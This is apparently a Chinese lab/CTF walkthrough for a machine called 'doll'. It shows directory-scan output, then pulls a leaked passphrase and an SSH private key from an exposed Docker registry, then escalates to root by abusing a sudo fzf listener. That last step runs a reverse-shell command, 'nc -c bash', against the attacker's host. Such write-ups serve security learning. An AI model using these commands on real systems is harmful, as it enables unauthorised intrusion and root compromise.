/http%3a%2f%2fdipplum (Status: 301) [Size: 0] [--> /http:/dipplum]
/http%3a%2f%2ftech    (Status: 301) [Size: 0] [--> /http:/tech]
/http%3a%2f%2finfobloggs (Status: 301) [Size: 0] [--> /http:/infobloggs]                                                                  
/http%3a%2f%2fcomputercase (Status: 301) [Size: 0] [--> /http:/computercase]                                                              
/http%3a%2f%2finfo11  (Status: 301) [Size: 0] [--> /http:/info11]
/http%3a%2f%2fuploads (Status: 301) [Size: 0] [--> /http:/uploads]
/http%3a%2f%2fforums  (Status: 301) [Size: 0] [--> /http:/forums]
/http%3a%2f%2fthechosenone47 (Status: 301) [Size: 0] [--> /http:/thechosenone47]                                                          
/http%3a%2f%2fblahblahland (Status: 301) [Size: 0] [--> /http:/blahblahland]                                                              
/http%3a%2f%2fpix-us  (Status: 301) [Size: 0] [--> /http:/pix-us]
/http%3a%2f%2fsoft-furnishings (Status: 301) [Size: 0] [--> /http:/soft-furnishings]                                                      
/http%3a%2f%2fmoblog  (Status: 301) [Size: 0] [--> /http:/moblog]
/http%3a%2f%2fblogzot9 (Status: 301) [Size: 0] [--> /http:/blogzot9]
/http%3a%2f%2falingeriediva (Status: 301) [Size: 0] [--> /http:/alingeriediva]                                                            
/http%3a%2f%2fthomas  (Status: 301) [Size: 0] [--> /http:/thomas]
/http%3a%2f%2fjoeanderson (Status: 301) [Size: 0] [--> /http:/joeanderson]                                                                
/http%3a%2f%2fstarkedsf (Status: 301) [Size: 0] [--> /http:/starkedsf]                                                                    
/http%3a%2f%2fblogtrauma (Status: 301) [Size: 0] [--> /http:/blogtrauma]                                                                  
/http%3a%2f%2fedmblog (Status: 301) [Size: 0] [--> /http:/edmblog]
/http%3a%2f%2fqwstnevrythg (Status: 301) [Size: 0] [--> /http:/qwstnevrythg]                                                              
/http%3a%2f%2fwesten30 (Status: 301) [Size: 0] [--> /http:/westen30]
/http%3a%2f%2fspeakingfreely (Status: 301) [Size: 0] [--> /http:/speakingfreely]                                                          
/http%3a%2f%2fjamesleejnr (Status: 301) [Size: 0] [--> /http:/jamesleejnr]                                                                
/http%3a%2f%2fwebdevelopment (Status: 301) [Size: 0] [--> /http:/webdevelopment]                                                          
/http%3a%2f%2ftechflock (Status: 301) [Size: 0] [--> /http:/techflock]                                                                    
/http%3a%2f%2fwebrepairservices (Status: 301) [Size: 0] [--> /http:/webrepairservices]                                                    
/http%3a%2f%2fbuscommresources (Status: 301) [Size: 0] [--> /http:/buscommresources]                                                      
/http%3a%2f%2feahopp  (Status: 301) [Size: 0] [--> /http:/eahopp]
/http%3a%2f%2fwesthamlet (Status: 301) [Size: 0] [--> /http:/westhamlet]                                                                  
/http%3a%2f%2froadlane (Status: 301) [Size: 0] [--> /http:/roadlane]
/http%3a%2f%2fwwwwakeupamericans-spree (Status: 301) [Size: 0] [--> /http:/wwwwakeupamericans-spree]                                      
/http%3a%2f%2fnoisyroom (Status: 301) [Size: 0] [--> /http:/noisyroom]                                                                    
/http%3a%2f%2fcomputersecurityreport (Status: 301) [Size: 0] [--> /http:/computersecurityreport]                                          
/http%3a%2f%2fchina-alberta (Status: 301) [Size: 0] [--> /http:/china-alberta]                                                            
/http%3a%2f%2fpajamasmedia (Status: 301) [Size: 0] [--> /http:/pajamasmedia]                                                              
/http%3a%2f%2fbusinessblogconsultant (Status: 301) [Size: 0] [--> /http:/businessblogconsultant]                                          
/http%3a%2f%2fcountenance (Status: 301) [Size: 0] [--> /http:/countenance]                                                                
/http%3a%2f%2fchrishoofnagle (Status: 301) [Size: 0] [--> /http:/chrishoofnagle]                                                          
/http%3a%2f%2fmparent7777 (Status: 301) [Size: 0] [--> /http:/mparent7777]                                                                
/http%3a%2f%2frushmooradt (Status: 301) [Size: 0] [--> /http:/rushmooradt]                                                                
/http%3a%2f%2flibertylevel (Status: 301) [Size: 0] [--> /http:/libertylevel]                                                              
/**http%3a%2f%2fad    (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/ad]
/**http%3a%2f%2fnews  (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/news]
/http%3a%2f%2fshiflett (Status: 301) [Size: 0] [--> /http:/shiflett]
/http%3a%2f%2fblogsearch (Status: 301) [Size: 0] [--> /http:/blogsearch]                                                                  
/feed%2fhttp%3a%2f%2fxenomachina (Status: 301) [Size: 0] [--> /feed/http:/xenomachina]                                                    
/feed%2fhttp%3a%2f%2fpersistent (Status: 301) [Size: 0] [--> /feed/http:/persistent]                                                      
/feed%2fhttp%3a%2f%2fmassless (Status: 301) [Size: 0] [--> /feed/http:/massless]                                                          
/feed%2fhttp%3a%2f%2fspaces (Status: 301) [Size: 0] [--> /feed/http:/spaces]                                                              
/feed%2fhttp%3a%2f%2fscobleizer (Status: 301) [Size: 0] [--> /feed/http:/scobleizer]                                                      
/feed%2fhttp%3a%2f%2ffury (Status: 301) [Size: 0] [--> /feed/http:/fury]                                                                  
/feed%2fhttp%3a%2f%2fdynin (Status: 301) [Size: 0] [--> /feed/http:/dynin]                                                                
/feed%2fhttp%3a%2f%2fwww (Status: 301) [Size: 0] [--> /feed/http:/www]                                                                    
/feed%2fhttp%3a%2f%2fblog (Status: 301) [Size: 0] [--> /feed/http:/blog]                                                                  
/feed%2fhttp%3a%2f%2fbokardo (Status: 301) [Size: 0] [--> /feed/http:/bokardo]                                                            
/feed%2fhttp%3a%2f%2fglobelogger (Status: 301) [Size: 0] [--> /feed/http:/globelogger]                                                    
/feed%2fhttp%3a%2f%2ffeeds (Status: 301) [Size: 0] [--> /feed/http:/feeds]                                                                
/feed%2fhttp%3a%2f%2fgoogle (Status: 301) [Size: 0] [--> /feed/http:/google]                                                              
/http%3a%2f%2fchris   (Status: 301) [Size: 0] [--> /http:/chris]
/http%3a%2f%2fpeople  (Status: 301) [Size: 0] [--> /http:/people]
/**http%3a%2f%2fdeveloper (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/developer]                                                            
/http%3a%2f%2fmeneame (Status: 301) [Size: 0] [--> /http:/meneame]
/http%3a%2f%2fbusiness2 (Status: 301) [Size: 0] [--> /http:/business2]                                                                    
/http%3a%2f%2favc     (Status: 301) [Size: 0] [--> /http:/avc]
/http%3a%2f%2fadam    (Status: 301) [Size: 0] [--> /http:/adam]
/%3ca_href%3d%22http%3a%2f%2fwww (Status: 301) [Size: 0] [--> /%3Ca_href=%22http:/www]                                                    
/http%3a%2f%2fjoi     (Status: 301) [Size: 0] [--> /http:/joi]
/http%3a%2f%2fjobs    (Status: 301) [Size: 0] [--> /http:/jobs]
Progress: 1185254 / 1185255 (100.00%)
===============================================================
Finished
===============================================================
```

<img width="969" height="657" alt="图片" src="https://github.com/user-attachments/assets/0ddb5ce1-07fb-455a-b65c-592eeddefd32" />

查看一下

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.8:1007/v2/_catalog 
{"repositories":["dolly"]}
```

枚举一下，得到了密码：passwd=devilcollectsit

```
┌──(kali㉿kali)-[~]
└─$ curl -s http://192.168.21.8:1007/v2/dolly/tags/list
{"name":"dolly","tags":["latest"]}
                                                                     
┌──(kali㉿kali)-[~]
└─$ curl -s http://192.168.21.8:1007/v2/dolly/manifests/latest
{
   "schemaVersion": 1,
   "name": "dolly",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\",\"container_config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2023-04-25T08:58:11.460540528Z\",\"docker_version\":\"23.0.4\",\"id\":\"89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\",\"os\":\"linux\",\"parent\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\",\"parent\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"ARG passwd=devilcollectsit\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"parent\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.348438709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "S2S5:NTEL:J6CP:UNRY:BEQG:N2K3:KJVI:BCAX:GH76:3MSH:3I6I:US6S",
               "kty": "EC",
               "x": "s1ZknCKNO40g8Jw3ay8PkQweFNMqLl3ZJ8q_3MmTi_o",
               "y": "fJVL9jUfyvNmRV0CQ_ohmtDGq9IQc4W9bdeCyB5uNt0"
            },
            "alg": "ES256"
         },
         "signature": "9QmU35p4P2yD9-G90k55E5N5uatJR7S1vlbd6T0l06iZaUjes8tbAbED_SiefVpvIeX6xeh-C3m88SCOYimiRA",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wOS0xNFQwODoxMDo1OFoifQ"
      }
   ]
}
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.8:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 --output blob1.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--100  3707  100  3707    0     0   701k      0 --:--:-- --:--:-- --:--:--  724k
                                                                     
┌──(kali㉿kali)-[~]
└─$ tar -xf blob1.tar
```

找到了私钥，用私钥进行登录，配合刚才得到的密码，成功登录

```
┌──(kali㉿kali)-[~/home/bela/.ssh]
└─$ ls -la
total 12
drwxr-xr-x 2 kali kali 4096 Apr 25  2023 .
drwxr-xr-x 3 kali kali 4096 Apr 25  2023 ..
-rw-r--r-- 1 kali kali 2635 Apr 25  2023 id_rsa
┌──(kali㉿kali)-[~/home/bela/.ssh]
└─$ ssh bela@192.168.21.8 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
bela@doll:~$
```

# 权限提升

寻找可能提权的地方

```
bela@doll:~$ sudo -l
Matching Defaults entries for bela on doll:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bela may run the following commands on doll:
    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
```

提权

```
需要再次开启一个ssh连接，在主机上开启监听端口
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
在第一个窗口运行fzf
bela@doll:~$ sudo /usr/bin/fzf --listen\=1337
在第二个窗口反弹到主机上
bela@doll:~$ curl -XPOST 127.0.0.1:1337 -d 'execute(nc -c bash 192.168.21.10 9001)'
就拿到了shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001 
listening on [any] 9001 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.8] 33942
id
uid=0(root) gid=0(root) grupos=0(root)
```
